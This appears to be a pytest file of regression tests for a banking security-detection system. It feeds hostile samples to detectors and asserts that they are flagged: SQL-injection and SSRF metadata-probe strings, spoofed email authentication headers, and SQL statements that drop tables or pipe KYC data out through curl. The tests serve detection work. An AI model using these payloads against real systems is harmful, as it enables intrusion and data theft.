"""Round-8 detector findings D8-1 … D8-17 — regression tests (each fails on the round-7 code)."""
from __future__ import annotations

import json
import os
import shutil
import time
from pathlib import Path

import pytest

SAMPLES = Path(__file__).resolve().parents[1] / "detect" / "samples" / "rules"


# ---- D8-1: a malformed Sigma rule is skipped once; the load result is cached ----------------------------------------

_BAD_RULES = {
    "logsource_str": "title: x\nid: x1\nlogsource: windows\ndetection:\n  sel: {Image|endswith: 'x.exe'}\n"
                     "  condition: sel\nlevel: high\n",
    "tags_int": "title: x\nid: x2\nlogsource: {category: process_creation}\ntags: 5\ndetection:\n"
                "  sel: {Image|endswith: 'x.exe'}\n  condition: sel\nlevel: high\n",
    "deep_condition": "title: x\nid: x3\nlogsource: {category: process_creation}\ndetection:\n"
                      "  sel: {Image|endswith: 'x.exe'}\n  condition: '" + "(" * 1200 + "sel" + ")" * 1200
                      + "'\nlevel: high\n",
    "int_block_name": "title: x\nid: x4\nlogsource: {category: process_creation}\ndetection:\n"
                      "  1: {Image|endswith: 'x.exe'}\n  sel_a: {Image: y}\n  condition: 1 of sel*\nlevel: high\n",
    "long_and_chain": "title: x\nid: x5\nlogsource: {category: process_creation}\ndetection:\n"
                      "  sel: {Image|endswith: 'x.exe'}\n  condition: '" + " and ".join(["sel"] * 3000) + "'\nlevel: high\n",
    "not_chain": "title: x\nid: x6\nlogsource: {category: process_creation}\ndetection:\n"
                 "  sel: {Image|endswith: 'x.exe'}\n  condition: '" + "not " * 2000 + "sel'\nlevel: high\n",
}

_PS_EVENT = {"class_uid": 1007, "activity_id": 1,
             "process": {"file": {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
                         "cmd_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="}}


@pytest.mark.parametrize("bad", sorted(_BAD_RULES))
def test_d8_1_malformed_rule_is_skipped_not_fatal(tmp_path, bad):
    from aegis.detect.sigma import SigmaEngine
    for p in SAMPLES.glob("*.yml"):
        shutil.copy(p, tmp_path / p.name)
    (tmp_path / "zz_bank_custom.yml").write_text(_BAD_RULES[bad])
    eng = SigmaEngine.from_dir(tmp_path)
    assert len(eng.rules) == 6
    assert sum(eng.skipped.values()) >= 3                        # the 2 unsupported samples + the bad rule
    assert [r.title for r in eng.match(_PS_EVENT)] == ["Encoded PowerShell command line"]


def test_d8_1_engine_from_env_caches_load_including_failure(tmp_path, monkeypatch):
    import aegis.detect.sigma as sg
    for p in SAMPLES.glob("*.yml"):
        shutil.copy(p, tmp_path / p.name)
    (tmp_path / "zz.yml").write_text(_BAD_RULES["logsource_str"])
    monkeypatch.setenv("AEGIS_SIGMA_RULES", str(tmp_path))
    monkeypatch.setattr(sg, "_ENGINE", None)
    monkeypatch.setattr(sg, "_ENGINE_KEY", ("", ""))
    calls = []
    real = sg.SigmaEngine.from_dir.__func__

    def counting(cls, root, **kw):
        calls.append(root)
        return real(cls, root, **kw)
    monkeypatch.setattr(sg.SigmaEngine, "from_dir", classmethod(counting))
    e1 = sg.engine_from_env()
    for _ in range(5):
        assert sg.engine_from_env() is e1
    assert len(calls) == 1
    assert e1.skipped.get("malformed") == 1

    # a load that raises is cached too: never a tree walk per event
    def boom(cls, root, **kw):
        calls.append(root)
        raise RuntimeError("disk gone")
    monkeypatch.setattr(sg.SigmaEngine, "from_dir", classmethod(boom))
    monkeypatch.setattr(sg, "_ENGINE", None)
    n = len(calls)
    e2 = sg.engine_from_env()
    assert e2 is not None and e2.rules == [] and sg.engine_from_env() is e2
    assert len(calls) == n + 1

    # a change in the directory reloads
    monkeypatch.setattr(sg.SigmaEngine, "from_dir", classmethod(counting))
    (tmp_path / "zz.yml").unlink()
    st = tmp_path.stat()
    os.utime(tmp_path, (st.st_atime, st.st_mtime + 5))
    e3 = sg.engine_from_env()
    assert e3 is not e2 and len(e3.rules) == 6


# ---- D8-14: |cidr and encoded web probes ------------------------------------------------------------------------------


@pytest.mark.parametrize("ip", ["::ffff:169.254.169.254", "::FFFF:A9FE:A9FE", "169.254.169.254 ", "[169.254.169.254]"])
def test_d8_14_cidr_unwraps_mapped_and_bracketed(ip):
    from aegis.detect.sigma import SigmaEngine
    eng = SigmaEngine.from_dir(SAMPLES)
    ev = {"class_uid": 4001, "activity_id": 1, "dst_endpoint": {"ip": ip},
          "actor": {"process": {"file": {"path": "/usr/bin/curl"}}}}
    assert [r.title for r in eng.match(ev)] == ["Connection to the cloud instance metadata service"]


@pytest.mark.parametrize("q", ["id=1%27%20or%201%3D1--", "id=1+union+select+1", "id=1%2527%2520or%25201%253D1",
                               "id=1 UNION/**/SELECT 1", "id=1 ＵＮＩＯＮ ＳＥＬＥＣＴ 1"])
def test_d8_14_web_rule_sees_decoded_query(q):
    from aegis.detect.sigma import SigmaEngine
    eng = SigmaEngine.from_dir(SAMPLES)
    assert [r.title for r in eng.match({"class_uid": 4002, "http_request": {"url": {"query_string": q}}})] == \
        ["SQL injection probe in the query string"]


# ---- D8-15: per-event caches --------------------------------------------------------------------------------------------


def test_d8_15_wide_event_dict_lowered_once_and_keyword_haystack_once(monkeypatch):
    import aegis.detect.sigma as sg
    rules = [sg.compile_rule({"title": f"f{i}", "id": f"f{i}", "logsource": {"product": "linux", "service": "syslog"},
                              "level": "high", "detection": {"sel": {f"VendorField{i}|contains": "needle"},
                                                             "condition": "sel"}}) for i in range(50)]
    rules += [sg.compile_rule({"title": f"k{i}", "id": f"k{i}", "logsource": {"product": "linux", "service": "syslog"},
                               "level": "high", "detection": {"keywords": [f"needle-{i}"], "condition": "keywords"}})
              for i in range(20)]
    eng = sg.SigmaEngine(rules=rules)
    calls = {"walk": 0}
    real = sg._str_values

    def counting(obj, out, depth=0, budget=None):
        if depth == 0:
            calls["walk"] += 1
        return real(obj, out, depth, budget)
    monkeypatch.setattr(sg, "_str_values", counting)
    lowered = {"n": 0}
    real_low = sg._lowered

    def count_low(obj):
        cache = sg._LOCAL.lowdicts
        if cache is None or id(obj) not in cache:
            lowered["n"] += 1
        return real_low(obj)
    monkeypatch.setattr(sg, "_lowered", count_low)
    ev = {"class_uid": 1008, "message": "needle-7", **{f"h{i}": "v" for i in range(5000)},
          "unmapped": {f"X-{i}": "v" for i in range(5000)}}
    t0 = time.time()
    hits = eng.match(ev)
    assert [r.title for r in hits] == ["k7"]
    assert calls["walk"] == 1                     # keyword haystack collected once for 20 keyword rules
    assert lowered["n"] <= 2                      # the top level and `unmapped`, once each — not once per field
    assert time.time() - t0 < 5


def test_d8_15_keyword_haystack_is_budgeted():
    from aegis.detect import sigma as sg
    out: list[str] = []
    sg._str_values({f"k{i}": "A" * 16_000 for i in range(1000)}, out)
    assert sum(map(len, out)) <= sg.KEYWORD_BUDGET


# ---- D8-2 / D8-3: Authentication-Results parsing -----------------------------------------------------------------------


def test_d8_2_m365_ar_without_authserv_id_keeps_spf(monkeypatch):
    from aegis.agents.email.tools import header_auth_check
    monkeypatch.delenv("AEGIS_MAIL_AUTHSERV_ID", raising=False)
    r = header_auth_check({"Authentication-Results": "spf=fail (sender IP is 203.0.113.9) smtp.mailfrom=evil.example; "
                           "dkim=pass (signature was verified) header.d=evil.example;dmarc=fail action=none "
                           "header.from=bank.in;compauth=fail reason=000"})
    assert r.data["spf"] == "fail" and r.data["dmarc"] == "fail" and r.weight == "high"


def test_d8_2_semicolon_inside_quotes_or_comment_does_not_split(monkeypatch):
    from aegis.agents.email.tools import header_auth_check
    monkeypatch.delenv("AEGIS_MAIL_AUTHSERV_ID", raising=False)
    r = header_auth_check({"Authentication-Results": 'mx.bank.in; spf=softfail (domain of "x;dkim=pass"@evil.example '
                           'does not designate) smtp.mailfrom="x;dkim=pass"@evil.example; dkim=none (no signature); '
                           'dmarc=pass header.from=evil.example'})
    assert r.data["dkim"] == "none"
    r = header_auth_check({"Authentication-Results": "mx.bank.in; spf=pass (a; dkim=pass) smtp.mailfrom=a.example; "
                           "dkim=fail; dmarc=fail"})
    assert r.data["dkim"] == "fail"


def test_d8_2_first_result_per_method_and_authserv_with_version(monkeypatch):
    from aegis.agents.email.tools import _ar_methods, _ar_parse
    assert _ar_parse("mx.bank.in 1; spf=pass")[0] == "mx.bank.in"
    assert _ar_methods("mx.bank.in; dkim=fail header.d=a; dkim=pass header.d=b")["dkim"] == "fail"


def test_d8_3_authserv_set_no_ours_never_reads_sender_shorthand(monkeypatch):
    from aegis.agents.email.tools import header_auth_check
    monkeypatch.setenv("AEGIS_MAIL_AUTHSERV_ID", "mx.bank.in")
    r = header_auth_check({"Authentication-Results": "attacker.example; spf=pass; dkim=pass; dmarc=pass",
                           "SPF": "pass", "DKIM": "pass", "DMARC": "pass"})
    assert r.data["spf"] is None and r.data["dkim"] is None and r.weight != "low"
    r = header_auth_check({"Authentication-Results": "mx.bank.in; spf=pass; dkim=pass; dmarc=pass"})
    assert r.weight == "low"


# ---- D8-4: honeytokens -------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("alert,tok", [
    ({"url": "/.git/./config"}, "ht_002"),
    ({"url": "/.git/x/../config"}, "ht_002"),
    ({"url": "/．git/config"}, "ht_002"),
    ({"payload": "A" * 200_001, "url": "/admin-internal-debug"}, "ht_001"),
    ({"headers": {**{f"X-Pad-{i}": "x" for i in range(100)}, "Authorization": "AKIA_DECOY_8X4F7Q2N"}}, "ht_003"),
    ({"user_agent": "curl AKIA_DECOY_8X4F7Q2N"}, "ht_003"),
    ({"referrer": "https://x/?k=AKIA_DECOY_8X4F7Q2N"}, "ht_003"),
    ({"matched_data": "/admin-internal-debug"}, "ht_001"),
    ({"query_string": "q=" + "A" * 200_000, "post_body": "key=AKIA_DECOY_8X4F7Q2N"}, "ht_003"),
    ({"request_headers": [{"name": "X-Api-Key", "value": "AKIA_DECOY_8X4F7Q2N"}]}, "ht_003"),
])
def test_d8_4_honeytoken_per_field_and_normalised(alert, tok):
    from aegis.agents.deception.honeytoken_monitor import HoneytokenMonitor
    hit = HoneytokenMonitor()._match(alert)
    assert hit is not None and hit.id == tok


def test_d8_4_honeytoken_no_false_hit():
    from aegis.agents.deception.honeytoken_monitor import HoneytokenMonitor
    assert HoneytokenMonitor()._match({"url": "/git/config", "user_agent": "Mozilla/5.0"}) is None


# ---- D8-5: cloud control plane -----------------------------------------------------------------------------------------


@pytest.mark.parametrize("event", [
    {"eventName": "DeleteAccountPublicAccessBlock", "eventSource": "s3.amazonaws.com",
     "requestParameters": {"accountId": "111122223333"}},
    {"eventName": "PutAccountPublicAccessBlock", "eventSource": "s3.amazonaws.com", "requestParameters": {
        "PublicAccessBlockConfiguration": {"BlockPublicAcls": False, "IgnorePublicAcls": True,
                                           "BlockPublicPolicy": True, "RestrictPublicBuckets": True}}},
    {"eventName": "PutBucketAcl", "requestParameters": {"bucketName": "b", "x-amz-acl": ["public-read"]}},
])
def test_d8_5_account_pab_and_acl_list_form(event):
    from aegis.agents.cloud_controlplane.tools import resource_policy_check
    assert resource_policy_check(event).weight == "high"


def test_d8_5_account_pab_fully_on_is_low():
    from aegis.agents.cloud_controlplane.tools import resource_policy_check
    r = resource_policy_check({"eventName": "PutAccountPublicAccessBlock", "requestParameters": {
        "PublicAccessBlockConfiguration": {"BlockPublicAcls": True, "IgnorePublicAcls": True,
                                           "BlockPublicPolicy": True, "RestrictPublicBuckets": True}}})
    assert r.weight == "low"


@pytest.mark.parametrize("stmt", [
    {"Effect": "Allow", "Action": ["iam:Put*", "sts:AssumeRole"], "Resource": "arn:aws:iam::111122223333:role/*"},
    {"Effect": "Allow", "Action": ["iam:Put*", "iam:Attach*"], "Resource": "arn:aws:iam::111122223333:user/*"},
    {"Effect": "Allow", "NotAction": "iam:DeleteAccountPasswordPolicy", "Resource": "*"},
])
def test_d8_5_escalation_and_notaction_are_high(stmt):
    from aegis.agents.cloud_controlplane.tools import iam_change_check
    r = iam_change_check({"eventName": "PutUserPolicy", "eventSource": "iam.amazonaws.com",
                          "requestParameters": {"policyDocument": json.dumps({"Statement": [stmt]})}})
    assert r.weight == "high"


def test_d8_5_scoped_assume_role_is_not_high():
    from aegis.agents.cloud_controlplane.tools import iam_change_check
    r = iam_change_check({"eventName": "PutUserPolicy", "eventSource": "iam.amazonaws.com",
                          "requestParameters": {"policyDocument": json.dumps({"Statement": [
                              {"Effect": "Allow", "Action": "sts:AssumeRole",
                               "Resource": "arn:aws:iam::111122223333:role/ReadOnly"}]})}})
    assert r.weight != "high"


# ---- D8-6 / D8-16: EDR domain matching and registrable names ---------------------------------------------------------


@pytest.fixture
def edr_state():
    from aegis.agents.edr import tools as e
    saved = (set(e._IOC_DOMAINS), set(e._IOC_DOMAIN_SUBTREE))
    yield e
    e._IOC_DOMAINS.clear(); e._IOC_DOMAINS.update(saved[0])
    e._IOC_DOMAIN_SUBTREE.clear(); e._IOC_DOMAIN_SUBTREE.update(saved[1])


def test_d8_6_untagged_ioc_matches_exactly_only(edr_state, monkeypatch):
    from aegis.agents.threat_intel.store import IOC, SUBDOMAIN_TAG, IOCStore
    e = edr_state
    monkeypatch.delenv("AEGIS_TI_MERGE_LLM_IOCS", raising=False)
    s = IOCStore()
    for d in ("web.core.windows.net", "gitlab.io", "onrender.com", "office.net", "bad-actor.example"):
        s.add(IOC(kind="domain", value=d, confidence=0.9, source="misp:event:1", last_seen=time.time()))
    s.add(IOC(kind="domain", value="*.c2-tagged.example", confidence=0.9, source="f", last_seen=time.time()))
    s.add(IOC(kind="domain", value="gitlab.io", confidence=0.9, source="f", last_seen=time.time(), tags=(SUBDOMAIN_TAG,)))
    s.merge_into_edr()
    for host in ("bankportal.z29.web.core.windows.net", "bank-docs.gitlab.io", "netbanking-api.onrender.com",
                 "r4.res.office.net", "www.bad-actor.example"):
        assert e.ioc_match(None, host, None).weight == "low", host
    assert e.ioc_match(None, "bad-actor.example", None).weight == "high"
    assert e.ioc_match(None, "x1.c2-tagged.example", None).weight == "high"
    assert e.ioc_match(None, "x7f.c2.attacker.test", None).weight == "high"          # seed, curated subtree


def test_d8_16_registrable_multi_label():
    from aegis.agents.edr.tools import _registrable, dns_exfil_check
    assert _registrable(["x", "blob", "core", "windows", "net"]) == "x.blob.core.windows.net"
    assert _registrable(["a", "acct", "z29", "web", "core", "windows", "net"]) == "acct.z29.web.core.windows.net"
    assert _registrable(["evil", "co", "in"]) == "evil.co.in"
    assert _registrable(["a", "b", "s3", "amazonaws", "com"]) == "b.s3.amazonaws.com"
    hosts = [f"stacct{i}.blob.core.windows.net" for i in range(30)] + [f"sb{i}.servicebus.windows.net" for i in range(25)]
    assert dns_exfil_check(hosts).data["high_concentration"] is False


# ---- D8-7 / D8-11: threat-intel store ---------------------------------------------------------------------------------


def test_d8_7_peer_entry_without_last_seen_is_not_fresh():
    from aegis.agents.threat_intel.store import IOCStore
    from aegis.agents.threat_intel.sync import import_from_peer
    c = IOCStore()
    import_from_peer(c, {"format": "aegis-ioc-sync/1", "source_region": "x", "iocs": [
        {"kind": "ip", "value": "198.51.100.8", "confidence": 0.9, "ttl_seconds": 86400}]})
    assert c.lookup("198.51.100.8", "ip") is None


def test_d8_11_revoked_and_expired_remove_stored_ioc():
    from aegis.agents.threat_intel.feeds import parse_stix_bundle
    from aegis.agents.threat_intel.store import IOCStore
    ind = {"type": "indicator", "id": "indicator--1", "pattern": "[ipv4-addr:value = '198.51.100.10']", "confidence": 90}
    st = IOCStore()
    st.add_many(parse_stix_bundle({"objects": [ind]}))
    assert st.lookup("198.51.100.10", "ip") is not None
    st.add_many(parse_stix_bundle({"objects": [{**ind, "revoked": "true"}]}))
    assert st.lookup("198.51.100.10", "ip") is None
    st.add_many(parse_stix_bundle({"objects": [ind]}))
    st.add_many(parse_stix_bundle({"objects": [{**ind, "valid_until": "2020-01-01T00:00:00Z"}]}))
    assert st.lookup("198.51.100.10", "ip") is None
    assert st.add_many(parse_stix_bundle({"objects": [{**ind, "revoked": True}]})) == 0


def test_d8_11_revoked_string_false_is_live():
    from aegis.agents.threat_intel.feeds import parse_stix_bundle
    from aegis.agents.threat_intel.store import RETRACTED_TAG
    out = parse_stix_bundle({"objects": [{"type": "indicator", "pattern": "[ipv4-addr:value = '198.51.100.30']",
                                          "revoked": "false"}]})
    assert len(out) == 1 and RETRACTED_TAG not in out[0].tags


def test_d8_11_republished_shorter_validity_shrinks_ttl():
    from aegis.agents.threat_intel.store import IOC, IOCStore
    now = time.time()
    s = IOCStore()
    s.add(IOC(kind="ip", value="198.51.100.9", confidence=0.9, source="f", last_seen=now, ttl_seconds=14 * 86400))
    s.add(IOC(kind="ip", value="198.51.100.9", confidence=0.9, source="f", last_seen=now, ttl_seconds=60))
    assert s.lookup("198.51.100.9", "ip").ttl_seconds == 60
    s.add(IOC(kind="ip", value="198.51.100.9", confidence=0.9, source="other", last_seen=now, ttl_seconds=86400))
    assert s.lookup("198.51.100.9", "ip").ttl_seconds == 86400          # another source vouching keeps the longer


def test_d8_11_retraction_reaches_edr_matcher(edr_state):
    from aegis.agents.threat_intel.feeds import parse_stix_bundle
    from aegis.agents.threat_intel.store import IOCStore
    e = edr_state
    ind = {"type": "indicator", "pattern": "[domain-name:value = 'retract-me.example']", "confidence": 90}
    s = IOCStore()
    s.add_many(parse_stix_bundle({"objects": [ind]}))
    s.merge_into_edr()
    assert e.ioc_match(None, "retract-me.example", None).weight == "high"
    s.add_many(parse_stix_bundle({"objects": [{**ind, "revoked": True}]}))
    s.merge_into_edr()
    assert e.ioc_match(None, "retract-me.example", None).weight == "low"


# ---- D8-8: NDR beacon on an approved AI SNI ---------------------------------------------------------------------------


def _beacon_alerts(det):
    alerts = []
    for i in range(40):
        alerts += det.observe({"kind": "tls", "src": "10.9.9.9", "dst": "203.0.113.9", "sni": "api.openai.com",
                               "dport": 443, "ts": 1_790_000_000 + 60 * i, "ja4": "t13d1516h2_8daaf6152771_02713d6af862"})
    return {a["alert_type"] for a in alerts if a}


def test_d8_8_approved_ai_sni_still_beacon_checked(monkeypatch):
    from aegis.agents.ndr.ai_usage import AiRegister, AiRegistration
    from aegis.agents.ndr.egress import EgressDetector
    monkeypatch.delenv("AEGIS_NDR_AI_PROVIDER_CIDRS", raising=False)
    assert "tls_beacon" in _beacon_alerts(EgressDetector(ai=AiRegister([AiRegistration("chatgpt-enterprise", (),
                                                                                       ("api.openai.com",))])))
    assert "tls_beacon" in _beacon_alerts(EgressDetector(ai=AiRegister([AiRegistration("kyc-bot", ("10.9.9.9",),
                                                                                       ("api.openai.com",))])))
    # the provider's listed range keeps the approved path quiet
    monkeypatch.setenv("AEGIS_NDR_AI_PROVIDER_CIDRS", "203.0.113.0/24")
    assert _beacon_alerts(EgressDetector(ai=AiRegister([AiRegistration("chatgpt-enterprise", (),
                                                                       ("api.openai.com",))]))) == set()


# ---- D8-9: DB query statements -----------------------------------------------------------------------------------------


@pytest.mark.parametrize("sql", [
    "COPY (SELECT " + ", ".join(f"col_{i}" for i in range(250)) + " FROM customer_kyc) TO '/tmp/x'",
    "COPY (SELECT /*" + "x" * 2100 + "*/ pan, aadhaar FROM customer_kyc) TO PROGRAM 'curl -T - https://x'",
    "/*" + " " * 16_400 + "*/ SELECT * FROM customers",
    "/*" + "-" * 16_400 + "*/ DROP TABLE ledger",
    "SELECT 1; " * 1700 + "SELECT * FROM customers INTO OUTFILE '/tmp/x'",
    "COPY customer_kyc TO '/tmp/x'",
    "\\copy customer_kyc to '/tmp/x' csv",
    "SELECT 1--1; DROP TABLE x",
])
def test_d8_9_risky_sql_found_per_statement(sql):
    from aegis.agents.api_abuse.tools import db_direct_query_check
    assert db_direct_query_check("dbeaver", sql, 10, "10.0.0.5").weight == "high"


def test_d8_9_bounded_and_benign():
    from aegis.agents.api_abuse.tools import db_direct_query_check
    t0 = time.time()
    assert db_direct_query_check("dbeaver", "copy (" * 20_000, 10, "10.0.0.5").weight == "low"
    assert db_direct_query_check("dbeaver", "x/" * 600_000, 10, "10.0.0.5").weight == "low"
    assert time.time() - t0 < 5
    assert db_direct_query_check("dbeaver", "COPY ledger FROM '/tmp/in.csv'; SELECT id FROM t", 10, "10.0.0.5").weight == "low"


# ---- D8-10: SSRF host normalisation -----------------------------------------------------------------------------------


@pytest.mark.parametrize("url", [
    "http://169.254.169.254%252enip.io/",
    "http%253A%252F%252F169.254.169.254%252Flatest",
    "http://169.254.169.254。nip.io/",
    "http://①⑥⑨.②⑤④.①⑥⑨.②⑤④/",
    "http://１６９．２５４．１６９．２５４/",
    "http://user@169.254.169.254.nip.io@evil.com/",
])
def test_d8_10_ssrf_encoded_hosts(url):
    from aegis.agents.perimeter.tools import ssrf_probe
    assert ssrf_probe(url).weight == "high"


def test_d8_10_ssrf_external_stays_low():
    from aegis.agents.perimeter.tools import ssrf_probe
    assert ssrf_probe("http://user@example.com/").weight == "low"
    assert ssrf_probe("http://169-254-169-254-nip.io.evil/").weight == "low"


# ---- D8-12: TCC noise --------------------------------------------------------------------------------------------------


def test_d8_12_apple_grant_without_authority_is_low_and_normalize_carries_authority():
    from aegis.agents.edr import normalize as n
    from aegis.agents.edr import tools as e
    r = e.tcc_grant("kTCCServiceMicrophone", "com.apple.FaceTime", 1, authority=None)
    assert r.weight == "low" and r.data["unverified_namespace"]
    assert e.tcc_grant("kTCCServiceMicrophone", "com.apple.evil", 1, authority="Developer ID Application: X").weight \
        == "medium"
    src = Path(n.__file__).read_text()
    assert "tcc_authority" in src


# ---- D8-13: INR amounts ------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("raw,val", [
    ("Rs 9,50,000/-", 950000.0), ("₹9,50,000/-", 950000.0), ("INR 9,50,000.00 Dr", 950000.0), ("₨9,50,000", 950000.0),
    ("Rs.9,50,000.00 CR", 950000.0), ("9.5 lakh", 950000.0), ("9.5L", 950000.0), ("1 Cr", 10_000_000.0),
    ("2 crore", 20_000_000.0), ("9,50,000", 950000.0), ("nan", None), ("five lakh", None),
])
def test_d8_13_amount_formats(raw, val):
    from aegis.agents.transaction.tools import _amount
    assert _amount(raw) == val


def test_d8_13_unparseable_amount_never_lowers_risk():
    from aegis.agents.transaction import tools as t
    assert t.aml_structuring_check(["Rs 9,50,000/-", "Rs 9,60,000/-", "Rs 9,55,000/-"]).weight == "high"
    r = t.payment_rail_anomaly("u_42891", "RTGS", "approx. nine lakh")
    assert r.data["amount_unknown"] and r.weight == "high"
    assert t.payment_rail_anomaly("u_42891", "RTGS", "500").weight == "medium"
    v = t.velocity_check("u_42891", 1, "garbled")
    assert v.data["amount_unknown"] and v.weight != "low"
    a = t.aml_structuring_check(["9,50,000", "?", "?"])
    assert a.weight != "low" and a.data["n_unparseable"] == 2


# ---- D8-17: SSID look-alikes -------------------------------------------------------------------------------------------


@pytest.mark.parametrize("ssid", ["BankWiFi-PoS-2", "BankWiFi-PoS 5G", "BankWiFi-PoS_5GHz", "BankWiFi-PoS-guest",
                                  "BankWiFi-P0S-2", "BnkWiFi-PoZ"])
def test_d8_17_decorated_and_two_edit_lookalikes(ssid):
    from aegis.agents.wireless import tools as w
    rec = {"ssid": ssid, "bssid": "de:ad:be:ef:00:01", "known_bssids": ["b4:99:ba:00:00:01"],
           "captive_portal_detected": True}
    assert w.rogue_ap_check(rec).weight == "high"
    assert w.evil_twin_check(rec).weight == "high"


@pytest.mark.parametrize("ssid", ["CafeWiFi", "JioFiber-5G", "HomeNet-2", "BankWiFi"])
def test_d8_17_unrelated_ssids_stay_clean(ssid):
    from aegis.agents.wireless import tools as w
    assert w._ssid_match(ssid) == (None, "")
